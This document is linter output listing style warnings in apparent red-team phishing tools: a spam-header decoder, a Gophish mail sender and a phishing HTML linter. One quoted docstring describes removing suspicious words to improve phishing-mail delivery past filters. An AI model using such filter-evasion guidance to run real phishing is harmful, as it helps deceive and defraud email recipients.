     |       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8523 | ΓÇªlt += f"- This header points at the original external Internet sender to be scanned with Enhanced Filtering:\n\n"
     |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8523:19
     |
8522 |         result = f"- Office365 Enhanced Filtering for Connector was enabled facilitating Exchange Online Protection / MS Defender foΓÇª
8523 |         result += f"- This header points at the original external Internet sender to be scanned with Enhanced Filtering:\n\n"
     |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8524 |
8525 |         parsed = {}
     |
help: Remove extraneous `f` prefix

W291 Trailing whitespace
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8546:180
     |
8544 | ΓÇª
8545 | ΓÇªor Office365.
8546 | ΓÇªtrue sender IP and not the hop before Exchange Online Protection. 
     |                                                                   ^
8547 | ΓÇª
8548 | ΓÇª
     |
help: Remove trailing whitespace

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8553:18
     |
8551 | ΓÇªe = SMTPHeadersAnalysis.flattenLine(value).strip()
8552 | ΓÇª
8553 | ΓÇªlt = f"- Office365 Enhanced Filtering for Connector was enabled facilitating Exchange Online Protection / MS Defender for Office365 protection.\n"
     |       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8554 | ΓÇªlt += f"- This header lists MTA servers that should be skipped from Enhanced Filtering scanning:\n\n"
     |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8554:19
     |
8553 |         result = f"- Office365 Enhanced Filtering for Connector was enabled facilitating Exchange Online Protection / MS Defender foΓÇª
8554 |         result += f"- This header lists MTA servers that should be skipped from Enhanced Filtering scanning:\n\n"
     |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8555 |
8556 |         parsed = {}
     |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8630:18
     |
8628 | This can lead to an internal information disclosure. This test shows potential hostname values extracted from Received headers as seΓÇª
8629 | """
8630 |         result = f"- Some MTAs (Mail Transfer Agents) probably exposed their internal Hostnames:\n"
     |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8631 |
8632 |         for hostname, hdr in self.mtaHostnamesExposed.items():
     |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8637:21
     |
8635 |             if hdr[0] == 1:
8636 |                 result += self.logger.colored(
8637 |                     f" (this might be the sender's computer hostname!)", "yellow"
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8638 |                 )
     |
help: Remove extraneous `f` prefix

B018 Found useless expression. Either assign it to a variable or remove it.
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8643:13
     |
8642 |             headers.append(hdr[1])
8643 |             4
     |             ^
8644 |             pos = hdr[2].lower().find(hostname.lower())
8645 |             val = hdr[2]
     |

E722 Do not use bare `except`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8794:9
     |
8792 |                 )
8793 |
8794 |         except:
     |         ^^^^^^
8795 |             pass
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8818:16
     |
8816 |             k0 = self.logger.colored(k, "magenta")
8817 |
8818 |             if k in SMTPHeadersAnalysis.TLCOOBClassifiers.keys():
     |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8819 |                 elem = SMTPHeadersAnalysis.TLCOOBClassifiers[k]
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8826:20
     |
8824 |                     result += f"\t- {k0}:{v}\n"
8825 |
8826 |                 if v in elem[1].keys():
     |                    ^^^^^^^^^^^^^^^^^^^
8827 |                     result += f"\t\t- " + elem[1][v] + "\n"
8828 |             else:
     |
help: Remove `.keys()`

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8827:31
     |
8826 |                 if v in elem[1].keys():
8827 |                     result += f"\t\t- " + elem[1][v] + "\n"
     |                               ^^^^^^^^^
8828 |             else:
8829 |                 result += f"\t- {k0}:{v}\n"
     |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8844:13
     |
8843 |         result = (
8844 |             f"- How much time did it take to deliver message from End-to-End: "
     |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8845 |             + self.logger.colored(value, "cyan")
8846 |         )
     |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8866:37
     |
8864 |         if words[0] != "pass":
8865 |             result += (
8866 |                 self.logger.colored(f"- Received-SPF test failed", "red")
     |                                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8867 |                 + f'\n\t- Should be "{self.logger.colored("pass", "green")}", but was: "'
8868 |                 + str(words[0])
     |
help: Remove extraneous `f` prefix

N803 Argument name `targetHeader` should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8919:42
     |
8917 |         return self._testAuthenticationResults("X-TM-Authentication-Results")
8918 |
8919 |     def _testAuthenticationResults(self, targetHeader):
     |                                          ^^^^^^^^^^^^
8920 |         headersCounted = 0
8921 |         headersCountedAll = 0
     |

N806 Variable `headersCounted` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8920:9
     |
8919 |     def _testAuthenticationResults(self, targetHeader):
8920 |         headersCounted = 0
     |         ^^^^^^^^^^^^^^
8921 |         headersCountedAll = 0
     |

N806 Variable `headersCountedAll` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8921:9
     |
8919 |     def _testAuthenticationResults(self, targetHeader):
8920 |         headersCounted = 0
8921 |         headersCountedAll = 0
     |         ^^^^^^^^^^^^^^^^^
8922 |
8923 |         for num, header, value in self.headers:
     |

B007 Loop control variable `num` not used within loop body
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8923:13
     |
8921 |         headersCountedAll = 0
8922 |
8923 |         for num, header, value in self.headers:
     |             ^^^
8924 |             if header.lower() == targetHeader.lower():
8925 |                 headersCountedAll += 1
     |
help: Rename unused `num` to `_num`

B007 Loop control variable `value` not used within loop body
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8923:26
     |
8921 |         headersCountedAll = 0
8922 |
8923 |         for num, header, value in self.headers:
     |                          ^^^^^
8924 |             if header.lower() == targetHeader.lower():
8925 |                 headersCountedAll += 1
     |
help: Rename unused `value` to `_value`

N806 Variable `headersCountedAll` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8925:17
     |
8923 |         for num, header, value in self.headers:
8924 |             if header.lower() == targetHeader.lower():
8925 |                 headersCountedAll += 1
     |                 ^^^^^^^^^^^^^^^^^
8926 |
8927 |         for num, header, value in self.headers:
     |

N806 Variable `headersCounted` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8929:17
     |
8927 |         for num, header, value in self.headers:
8928 |             if header.lower() == targetHeader.lower():
8929 |                 headersCounted += 1
     |                 ^^^^^^^^^^^^^^
8930 |                 SMTPHeadersAnalysis.Handled_Spam_Headers.append(header.lower())
8931 |                 out = self._testAuthenticationResultsWorker(num, header, value)
     |

E741 Ambiguous variable name: `l`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8945:13
     |
8943 |         result = ""
8944 |
8945 |         for l in re.findall(r"([a-z]+=[a-zA-Z0-9]+)", value, re.I):
     |             ^
8946 |             a, b = l.lower().split("=")
8947 |             tests[a] = b
     |

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8957:16
     |
8955 |                 expected.append("bestguesspass")
8956 |
8957 |             if k in tests.keys() and tests[k] not in expected:
     |                ^^^^^^^^^^^^^^^^^
8958 |                 p = self.logger.colored("pass", "green")
8959 |                 p2 = self.logger.colored(tests[k], "red")
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8970:25
     |
8968 |                 if (
8969 |                     k.lower() == "dkim"
8970 |                     and tests[k] in SMTPHeadersAnalysis.auth_result.keys()
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8971 |                 ):
8972 |                     result += (
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8989:12
     |
8988 |     def collectIpGeo(self, addr):
8989 |         if addr in self.ipgeoCache.keys():
     |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8990 |             return self.ipgeoCache[addr]
     |
help: Remove `.keys()`

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:8994:29
     |
8992 |         tmp = ""
8993 |         try:
8994 |             self.logger.dbg(f"testExtractIP: Collecting IP Geo metadata...")
     |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8995 |
8996 |             r = requests.get(
     |
help: Remove extraneous `f` prefix

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9008:23
     |
9006 |             out = r.json()
9007 |
9008 |             if out != None and len(out) > 0 and type(out) is dict:
     |                       ^^^^
9009 |                 tmp += f"\t\t- IP Geo metadata:\n"
9010 |                 for k, v in out.items():
     |
help: Replace with `cond is not None`

F541 [*] f-string without any placeholders
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9009:24
     |
9008 |             if out != None and len(out) > 0 and type(out) is dict:
9009 |                 tmp += f"\t\t- IP Geo metadata:\n"
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^
9010 |                 for k, v in out.items():
9011 |                     k1 = k
     |
help: Remove extraneous `f` prefix

F841 [*] Local variable `e` is assigned to but never used
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9028:29
     |
9026 |                     tmp += f"\t\t\t- {k}: {v}\n"
9027 |
9028 |         except Exception as e:
     |                             ^
9029 |             pass
     |
help: Remove assignment to unused variable `e`

N806 Variable `rawAddr` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9058:21
     |
9056 |                     out = SMTPHeadersAnalysis.resolveAddress(addr)
9057 |
9058 |                     rawAddr = addr
     |                     ^^^^^^^
9059 |                     addr = self.logger.colored(addr, "magenta")
9060 |                     tmp += f"\n\t- Found IP address: {addr}\n"
     |

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9062:31
     |
9060 |                     tmp += f"\n\t- Found IP address: {addr}\n"
9061 |
9062 |                     if out != None and len(out) > 0 and out != addr:
     |                               ^^^^
9063 |                         tmp += f"\t\t- that resolves to: {out}\n"
     |
help: Replace with `cond is not None`

F841 [*] Local variable `e` is assigned to but never used
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9070:33
     |
9068 |                     tmp += f"\t- Found IP address: {addr}\n"
9069 |
9070 |             except Exception as e:
     |                                 ^
9071 |                 tmp += f"\t- Found IP address: ({addr}) that wasn't resolved\n"
     |
help: Remove assignment to unused variable `e`

F841 [*] Local variable `e` is assigned to but never used
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9136:33
     |
9134 |                     tmp += f'\t- Found Domain:   {self.logger.colored(d2, "yellow")}\n'
9135 |
9136 |             except Exception as e:
     |                                 ^
9137 |                 tmp += f'\t- Found Domain:   ({self.logger.colored(d, "magenta")}) that wasn\'t resolved\n'
     |
help: Remove assignment to unused variable `e`

B007 Loop control variable `num` not used within loop body
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9159:13
     |
9157 |     def testBadKeywords(self):
9158 |         result = ""
9159 |         for num, header, value in self.headers:
     |             ^^^
9160 |             for w in SMTPHeadersAnalysis.bad_keywords:
9161 |                 if w.lower() in value.lower():
     |
help: Rename unused `num` to `_num`

N806 Variable `testStart` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9291:5
     |
9289 |     output = ""
9290 |
9291 |     testStart = "-----------------------------------------"
     |     ^^^^^^^^^
9292 |     testEnd = ""
     |

N806 Variable `testEnd` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9292:5
     |
9291 |     testStart = "-----------------------------------------"
9292 |     testEnd = ""
     |     ^^^^^^^
9293 |
9294 |     if options["format"] == "html":
     |

N806 Variable `testStart` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9295:9
     |
9294 |     if options["format"] == "html":
9295 |         testStart = ">>>>>>>>>>>>>>>>>>>>>>"
     |         ^^^^^^^^^
9296 |         testEnd = "<<<<<<<<<<<<<<<<<<<<<<"
     |

N806 Variable `testEnd` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9296:9
     |
9294 |     if options["format"] == "html":
9295 |         testStart = ">>>>>>>>>>>>>>>>>>>>>>"
9296 |         testEnd = "<<<<<<<<<<<<<<<<<<<<<<"
     |         ^^^^^^^
9297 |
9298 |     if options["format"] == "text" or options["format"] == "html":
     |

SIM113 Use `enumerate()` for index variable `num` in `for` loop
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9303:13
     |
9302 |         for k, v in out.items():
9303 |             num += 1
     |             ^^^^^^^^
9304 |             analysis = v["analysis"]
9305 |             value = v["value"]
     |

W291 Trailing whitespace
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9336:41
     |
9335 |                 description = f"""
9336 | {logger.colored("DESCRIPTION", "blue")}: 
     |                                         ^
9337 |     {desc}
9338 | """
     |
help: Remove trailing whitespace

W291 Trailing whitespace
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9345:36
     |
9343 | ({num}) Test: {logger.colored(k, "cyan")}
9344 |
9345 | {logger.colored("HEADER", "blue")}: 
     |                                    ^
9346 |     {v['header']}
9347 | {description}
     |
help: Remove trailing whitespace

W291 Trailing whitespace
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9348:35
     |
9346 |     {v['header']}
9347 | {description}
9348 | {logger.colored("VALUE", "blue")}: 
     |                                   ^
9349 |     {value}
     |
help: Remove trailing whitespace

N806 Variable `testStart` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9374:5
     |
9373 | def formatToHtml(body, headers):
9374 |     testStart = ">>>>>>>>>>>>>>>>>>>>>>"
     |     ^^^^^^^^^
9375 |     testEnd = "<<<<<<<<<<<<<<<<<<<<<<"
     |

N806 Variable `testEnd` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9375:5
     |
9373 | def formatToHtml(body, headers):
9374 |     testStart = ">>>>>>>>>>>>>>>>>>>>>>"
9375 |     testEnd = "<<<<<<<<<<<<<<<<<<<<<<"
     |     ^^^^^^^
9376 |
9377 |     body = body.replace(testStart, "<div><hr/>")
     |

N806 Variable `outputHtml` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9399:5
     |
9397 |     body = body2
9398 |
9399 |     outputHtml = f"""
     |     ^^^^^^^^^^
9400 | <!DOCTYPE html>
9401 | <html lang="en">
     |

W291 Trailing whitespace
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9444:5
     |
9442 |   .text-magenta {{
9443 |     color: {Logger.html_colors_map['magenta']};
9444 |   }}  
     |     ^^
9445 |
9446 |   .text-cyan {{
     |
help: Remove trailing whitespace

W291 Trailing whitespace
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9522:28
     |
9520 |     font-variant: normal;
9521 |     font-weight: 400;
9522 |     line-height: 18.5714px;    
     |                            ^^^^
9523 | }}
     |
help: Remove trailing whitespace

C416 Unnecessary list comprehension (rewrite using `list()`)
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9589:13
     |
9587 |         (a, b, c) = an.getAllTests()
9588 |         d = a + b + c
9589 |         e = [x for x in sorted(d, key=lambda item: int(item[0]))]
     |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
9590 |
9591 |         for test in e:
     |
help: Rewrite using `list()`

N806 Variable `testId` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9592:14
     |
9591 |         for test in e:
9592 |             (testId, testName, testFunc) = test
     |              ^^^^^^
9593 |
9594 |             if test in b:
     |

N806 Variable `testName` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9592:22
     |
9591 |         for test in e:
9592 |             (testId, testName, testFunc) = test
     |                      ^^^^^^^^
9593 |
9594 |             if test in b:
     |

N806 Variable `testFunc` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9592:32
     |
9591 |         for test in e:
9592 |             (testId, testName, testFunc) = test
     |                                ^^^^^^^^
9593 |
9594 |             if test in b:
     |

N806 Variable `testName` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9595:17
     |
9594 |             if test in b:
9595 |                 testName += " (use -a to show its results)"
     |                 ^^^^^^^^
9596 |             print(f"\t{testId: >7} - {testName}")
     |

N806 Variable `maxTest` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9605:5
     |
9603 |     an0 = SMTPHeadersAnalysis(logger)
9604 |     (a, b, c) = an0.getAllTests()
9605 |     maxTest = 0
     |     ^^^^^^^
9606 |     for i in a + b + c:
9607 |         test = int(i[0])
     |

N806 Variable `maxTest` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9610:13
     |
9609 |         if test > maxTest:
9610 |             maxTest = test
     |             ^^^^^^^
9611 |
9612 |     text = ""
     |

C403 Unnecessary list comprehension (rewrite as a set comprehension)
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9621:29
     |
9620 |           if len(args.include_tests) > 0:
9621 |               include_tests = set(
     |  _____________________________^
9622 | |                 [int(x) for x in args.include_tests.replace(" ", "").split(",")]
9623 | |             )
     | |_____________^
9624 |           if len(args.exclude_tests) > 0:
9625 |               exclude_tests = set(
     |
help: Rewrite as a set comprehension

C403 Unnecessary list comprehension (rewrite as a set comprehension)
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9625:29
     |
9623 |               )
9624 |           if len(args.exclude_tests) > 0:
9625 |               exclude_tests = set(
     |  _____________________________^
9626 | |                 [int(x) for x in args.exclude_tests.replace(" ", "").split(",")]
9627 | |             )
     | |_____________^
9628 |
9629 |           if len(include_tests) > 0 and len(exclude_tests) > 0:
     |
help: Rewrite as a set comprehension

N806 Variable `_testsToRun` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9639:5
     |
9637 |         )
9638 |
9639 |     _testsToRun = set()
     |     ^^^^^^^^^^^
9640 |
9641 |     for i in range(maxTest + 5):
     |

SIM102 Use a single `if` statement instead of nested `if` statements
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9646:9
     |
9644 |                   continue
9645 |
9646 | /         elif len(exclude_tests) > 0:
9647 | |             if i in exclude_tests:
     | |__________________________________^
9648 |                   continue
     |
help: Combine `if` statements using `and`

N806 Variable `testsToRun` in function should be lowercase
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9652:5
     |
9650 |         _testsToRun.add(i)
9651 |
9652 |     testsToRun = sorted(_testsToRun)
     |     ^^^^^^^^^^
9653 |
9654 |     an = SMTPHeadersAnalysis(
     |

W291 Trailing whitespace
    --> security\penetration-testing-tools\phishing\decode-spam-headers\decode-spam-headers.py:9673:63
     |
9671 | ------------------------------------------
9672 |
9673 | Experiencing a bad-looking output with unprintable characters? 
     |                                                               ^
9674 | Use -N flag to disable console colors, or switch your console for better UI experience.
9675 | """
     |
help: Remove trailing whitespace

F401 [*] `json` imported but unused
 --> security\penetration-testing-tools\phishing\gophish-send-mail\gophish-send-mail.py:4:8
  |
3 | import argparse
4 | import json
  |        ^^^^
5 | import os
6 | import re
  |
help: Remove unused import: `json`

F401 [*] `os` imported but unused
 --> security\penetration-testing-tools\phishing\gophish-send-mail\gophish-send-mail.py:5:8
  |
3 | import argparse
4 | import json
5 | import os
  |        ^^
6 | import re
7 | import string
  |
help: Remove unused import: `os`

F401 [*] `re` imported but unused
 --> security\penetration-testing-tools\phishing\gophish-send-mail\gophish-send-mail.py:6:8
  |
4 | import json
5 | import os
6 | import re
  |        ^^
7 | import string
8 | import sys
  |
help: Remove unused import: `re`

F401 [*] `string` imported but unused
 --> security\penetration-testing-tools\phishing\gophish-send-mail\gophish-send-mail.py:7:8
  |
5 | import os
6 | import re
7 | import string
  |        ^^^^^^
8 | import sys
  |
help: Remove unused import: `string`

F841 Local variable `out` is assigned to but never used
  --> security\penetration-testing-tools\phishing\gophish-send-mail\gophish-send-mail.py:93:5
   |
91 |         obj["subject"] = options["subject"]
92 |
93 |     out = put(f'/api/templates/{template["id"]}', obj)
   |     ^^^
   |
help: Remove assignment to unused variable `out`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\phishing\gophish-send-mail\gophish-send-mail.py:132:12
    |
131 |     for k in ("gophish_addr", "token", "file", "template_name", "recipient", "sender"):
132 |         if k not in op.keys():
    |            ^^^^^^^^^^^^^^^^^^
133 |             print(f"[!] {k} not specified!")
134 |             sys.exit(1)
    |
help: Remove `.keys()`

F401 [*] `string` imported but unused
 --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:7:8
  |
5 | import os
6 | import re
7 | import string
  |        ^^^^^^
8 | import sys
9 | import textwrap
  |
help: Remove unused import: `string`

F401 [*] `yaml` imported but unused
  --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:12:8
   |
10 | from urllib import parse
11 |
12 | import yaml
   |        ^^^^
13 |
14 | try:
   |
help: Remove unused import: `yaml`

E711 Comparison to `None` should be `cond is not None`
  --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:75:20
   |
73 |     def __init__(self, opts=None):
74 |         self.options.update(Logger.options)
75 |         if opts != None and len(opts) > 0:
   |                    ^^^^
76 |             self.options.update(opts)
   |
help: Replace with `cond is not None`

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:80:16
   |
78 |     @staticmethod
79 |     def with_color(c, s):
80 |         return "\x1b[%dm%s\x1b[0m" % (c, s)
   |                ^^^^^^^^^^^^^^^^^^^
81 |
82 |     def colored(self, txt, col):
   |
help: Replace with format specifiers

E711 Comparison to `None` should be `cond is None`
  --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:92:19
   |
90 |     @staticmethod
91 |     def out(txt, fd, mode="info ", **kwargs):
92 |         if txt == None or fd == "none":
   |                   ^^^^
93 |             return
94 |         elif fd == None:
   |
help: Replace with `cond is None`

E711 Comparison to `None` should be `cond is None`
  --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:94:20
   |
92 |         if txt == None or fd == "none":
93 |             return
94 |         elif fd == None:
   |                    ^^^^
95 |             raise Exception("[ERROR] Logging descriptor has not been specified!")
   |
help: Replace with `cond is None`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:100:12
    |
 98 |         args.update(kwargs)
 99 |
100 |         if type(txt) != str:
    |            ^^^^^^^^^^^^^^^^
101 |             txt = str(txt)
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:109:16
    |
107 |         elif args["color"]:
108 |             col = args["color"]
109 |             if type(col) == str and col in Logger.colors_map.keys():
    |                ^^^^^^^^^^^^^^^^
110 |                 col = Logger.colors_map[col]
111 |         else:
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:109:37
    |
107 |         elif args["color"]:
108 |             col = args["color"]
109 |             if type(col) == str and col in Logger.colors_map.keys():
    |                                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
110 |                 col = Logger.colors_map[col]
111 |         else:
    |
help: Remove `.keys()`

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:116:20
    |
114 |         prefix = ""
115 |         if mode:
116 |             mode = "[%s] " % mode
    |                    ^^^^^^^^^^^^^^
117 |
118 |         if not args["noprefix"]:
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:123:50
    |
121 |             else:
122 |                 prefix = Logger.with_color(
123 |                     Logger.colors_dict["other"], "%s" % (mode.upper())
    |                                                  ^^^^^^^^^^^^^^^^^^^^^
124 |                 )
    |
help: Replace with format specifiers

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:127:9
    |
126 |           nl = ""
127 | /         if "newline" in args:
128 | |             if args["newline"]:
    | |_______________________________^
129 |                   nl = "\n"
    |
help: Combine `if` statements using `and`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:134:12
    |
132 |             fd = sys.stdout
133 |
134 |         if type(fd) == str:
    |            ^^^^^^^^^^^^^^^
135 |             with open(fd, "a") as f:
136 |                 prefix2 = ""
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:138:31
    |
136 |                 prefix2 = ""
137 |                 if mode:
138 |                     prefix2 = "%s" % (mode.upper())
    |                               ^^^^^^^^^^^^^^^^^^^^^
139 |                 f.write(prefix2 + txt + nl)
140 |                 f.flush()
    |
help: Replace with format specifiers

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:154:17
    |
152 |             forced
153 |             or (self.options["verbose"] or self.options["debug"])
154 |             or (type(self.options["log"]) == str and self.options["log"] != "none")
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
155 |         ):
156 |             Logger.out(txt, self.options["log"], "info", **kwargs)
    |

W291 Trailing whitespace
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1343:83
     |
1341 |         desc = """
1342 |
1343 | Input text message contained words considered as suspicious in context of E-Mails.  
     |                                                                                   ^^
1344 | Therefore you will have better chances of delivering your phishing e-mail when you get rid of them.
     |
help: Remove trailing whitespace

N806 Variable `foundWords` in function should be lowercase
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1351:9
     |
1350 |         text = self.html
1351 |         foundWords = set()
     |         ^^^^^^^^^^
1352 |         totalChecked = 0
1353 |         totalFound = 0
     |

N806 Variable `totalChecked` in function should be lowercase
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1352:9
     |
1350 |         text = self.html
1351 |         foundWords = set()
1352 |         totalChecked = 0
     |         ^^^^^^^^^^^^
1353 |         totalFound = 0
     |

N806 Variable `totalFound` in function should be lowercase
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1353:9
     |
1351 |         foundWords = set()
1352 |         totalChecked = 0
1353 |         totalFound = 0
     |         ^^^^^^^^^^
1354 |
1355 |         for title, words in PhishingMailParser.Suspicious_Words.items():
     |

N806 Variable `totalChecked` in function should be lowercase
    --> security\penetration-testing-tools\phishing\phishing-HTML-linter.py:1362:17
     |
